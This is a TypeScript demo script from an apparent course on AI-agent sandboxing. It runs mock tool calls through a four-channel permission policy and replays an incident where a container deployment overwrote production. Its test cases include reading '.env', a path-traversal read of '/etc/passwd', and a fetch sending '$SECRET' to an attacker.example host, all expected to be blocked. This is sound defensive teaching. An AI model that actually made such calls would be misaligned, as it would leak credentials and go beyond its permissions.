// ============================================================
// demo 入口 —— 沙箱与凭据 §S2：四通道 policy 引擎 + 幽灵事故重放
//   npm run demo   全离线确定性：不调模型 / 不联网 / 不碰真实 FS / 不用墙钟
// ============================================================
import { Policy, makeApprover } from "./policy.js";
import { Sandbox, makeHostWorld, makeSandboxWorld } from "./sandbox.js";
import { execTool, type ExecCtx } from "./tools.js";
import type { ToolCall } from "./types.js";
import { APPROVAL_TABLE, ENV_WHITELIST, GATE_ONLY_RULES, GHOST_SCRIPT, HOST_ENV, POLICY_4CH_RULES, SESSION_WORKSPACE } from "./scenario.js";
import { assertDeterministic, runScript, transcriptToString } from "./replay.js";

/** 事故会话的沙箱：workspace=它自己的（幽灵）树，egress 关，凭据不进可见 env */
function freshSessionSandbox(): Sandbox {
  return new Sandbox({ workspace: SESSION_WORKSPACE, envWhitelist: ENV_WHITELIST, network: "deny" }, makeSandboxWorld("sandbox", makeHostWorld(), SESSION_WORKSPACE), HOST_ENV);
}

/** 一、判定流剧本：覆盖四通道 + fallback + 参数级匹配 + 冲突优先级 */
const FLOW_SCRIPT: ToolCall[] = [
  { id: "f1", tool: "read_file", args: { path: "work/ainews-old/README.md" }, note: "低风险、边界内" },
  { id: "f2", tool: "read_file", args: { path: ".env" }, note: "冲突: 同时命中 s-allow-read，deny 优先" },
  { id: "f3", tool: "write_file", args: { path: "work/ainews-old/out/notes.md", content: "S2 demo 笔记" }, note: "审批通过" },
  { id: "f4", tool: "write_file", args: { path: "work/ainews-old/out/report.md", content: "周报" }, note: "审批被拒（拒绝也是合法结果）" },
  { id: "f5", tool: "write_file", args: { path: "work/ainews-new/README.md", content: "越权写入" }, note: "冲突: deny 优先于 approve" },
  { id: "f6", tool: "docker_compose_up", args: { project: "finfo", dir: "work/ainews-old", services: ["worker"] } },
  { id: "f7", tool: "net_fetch", args: { url: "https://api.example.com/v1" } },
  { id: "f8", tool: "run_shell", args: { cmd: "df -h" } },
  { id: "f9", tool: "ghost_tool", args: { x: 1 }, note: "无规则 → fallback deny" },
];
const FLOW_EXPECTED = ["ok", "denied", "ok", "denied", "denied", "ok", "blocked", "denied", "denied"];

function main(): void {
  const policy4 = new Policy(POLICY_4CH_RULES);
  const approver = makeApprover(APPROVAL_TABLE);
  console.log("[sandbox-demo] 沙箱与凭据 §S2 · 四通道 policy 引擎 + 幽灵事故重放（全离线确定性：mock 工具执行器，不调模型）\n");

  console.log("一、四通道 policy 判定流（S2）");
  console.log("    通道语义: allow=直接执行 / approve=人工审批(离线=预置审批表) / deny=拒绝 / sandbox=隔离环境内执行");
  console.log("    冲突优先级: deny > approve > sandbox > allow；默认=deny（安全默认）\n");
  const tf = runScript({ label: "判定流", script: FLOW_SCRIPT, policy: policy4, approver, host: makeHostWorld(), hostEnv: HOST_ENV, sandbox: freshSessionSandbox() });
  for (const l of tf.lines) console.log(`  ${l}`);
  const flowOk = tf.steps.length === FLOW_EXPECTED.length && tf.steps.every((s, i) => s.status === FLOW_EXPECTED[i]);
  const chs = tf.steps.map((s) => s.channel);
  const covered = ["allow", "approve", "deny", "sandbox"].every((c) => chs.includes(c)) && tf.steps.some((s) => s.ruleId === null);
  console.log(`    覆盖自检: ${flowOk && covered ? "✅ 四通道+fallback 全部按预期落通道" : "❌ 有判定不符合预期"}`);

  console.log("\n二、沙箱边界（S1：权限门管'能不能做'，沙箱管'做了能炸多大'）");
  const hostB = makeHostWorld();
  const sb = freshSessionSandbox();
  const ctxNoSb: ExecCtx = { host: hostB, sandbox: null, hostEnv: HOST_ENV, step: 0 };
  const ctxSb: ExecCtx = { host: hostB, sandbox: sb, hostEnv: HOST_ENV, step: 0 };
  console.log("  [II-1] 路径边界：权限门放行，沙箱拦截");
  const tPath = runScript({ label: "路径越界", script: [{ id: "p1", tool: "read_file", args: { path: "../../etc/passwd" } }], policy: policy4, approver, host: hostB, hostEnv: HOST_ENV, sandbox: sb });
  for (const l of tPath.lines.slice(1)) console.log(`  ${l}`);
  console.log("  [II-2] env 边界：敏感凭据不进 agent 可见的 env（S4）");
  console.log(`    无沙箱层: ${execTool("print_env", {}, ctxNoSb)}`);
  console.log(`    有沙箱层: ${execTool("print_env", {}, ctxSb)}`);
  console.log("  [II-3] 网络边界：egress 默认禁用（S3：egress 是最难关的一档）");
  const tNet = runScript({ label: "出网尝试", script: [{ id: "n1", tool: "net_fetch", args: { url: "https://attacker.example.com/$SECRET" } }], policy: policy4, approver, host: hostB, hostEnv: HOST_ENV, sandbox: sb });
  for (const l of tNet.lines.slice(1)) console.log(`  ${l}`);
  console.log("    （S4 闭环：即使凭据被读走，没有出网通道就发不出去）");
  const boundaryOk = tPath.steps[0].status === "blocked" && tNet.steps[0].status === "blocked";

  console.log("\n三、幽灵事故重放（FinHot 2026-10-09 18:00，恢复代价 25 分钟；同一输入序列跑两遍）：");
  for (const c of GHOST_SCRIPT) console.log(`      ${c.id} ${c.tool} ${JSON.stringify(c.args)} —— ${c.note}`);
  const mkRunA = () => ({ label: "A · 仅权限门（沙箱与凭据之前，复现事故）", script: GHOST_SCRIPT, policy: new Policy(GATE_ONLY_RULES), approver, host: makeHostWorld(), hostEnv: HOST_ENV, sandbox: null });
  const mkRunB = () => ({ label: "B · 四通道 policy + 沙箱（本课之后）", script: GHOST_SCRIPT, policy: policy4, approver, host: makeHostWorld(), hostEnv: HOST_ENV, sandbox: freshSessionSandbox() });
  const ta = runScript(mkRunA());
  for (const l of ta.lines) console.log(`    ${l}`);
  const aCaught = ta.steps[3].output?.includes("被替换") ?? false;
  console.log(`    结论: ${aCaught ? "⚠️ 事故已发生 —— 生产 finfo-worker 在 step 3 被换成幽灵代码，直到 step 4 事后校验才暴露（恢复代价 25 分钟）" : "生产未被污染"}`);
  const tb = runScript(mkRunB());
  for (const l of tb.lines) console.log(`    ${l}`);
  const bSafe = tb.steps[3].output?.includes("正常") ?? false;
  console.log(`    结论: ${bSafe ? "✅ 生产未被触碰 —— step 3（docker_compose_up）经 sandbox 通道在隔离命名空间执行，这正是'该被 sandbox 通道拦住的'那一步" : "❌ 生产仍被污染"}`);

  console.log("\n四、确定性验收（S6：同一剧本跑 N 次，输出逐字节相同）");
  const detA = assertDeterministic("A（仅权限门）", () => transcriptToString(runScript(mkRunA())), 3);
  for (const l of detA.lines) console.log(`  ${l}`);
  const detB = assertDeterministic("B（四通道+沙箱）", () => transcriptToString(runScript(mkRunB())), 3);
  for (const l of detB.lines) console.log(`  ${l}`);

  const ok = flowOk && covered && boundaryOk && detA.ok && detB.ok && aCaught && bSafe;
  console.log("\n══════════════════════════════════════");
  console.log("[总结]");
  console.log("  - 该被 sandbox 通道拦住的步骤: step 3 docker_compose_up（动作合法，但必须关容器命名空间）");
  console.log("  - 权限门（A⑤）只回答'能不能做'（幽灵事故里每个动作都'能做'，照样炸了生产）；沙箱层（S2）回答'做了能炸多大'：隔离命名空间让同一命令只影响自己的世界视图");
  console.log(`  - 重放一致性: A ${detA.ok ? "✅ 3 次逐字节一致" : "❌ 不一致"} / B ${detB.ok ? "✅ 3 次逐字节一致" : "❌ 不一致"}`);
  console.log(ok ? "✅ 重放一致性断言通过（全部验收项达标）" : "❌ 存在未通过的验收项");
  if (!ok) process.exit(1);
}

main();
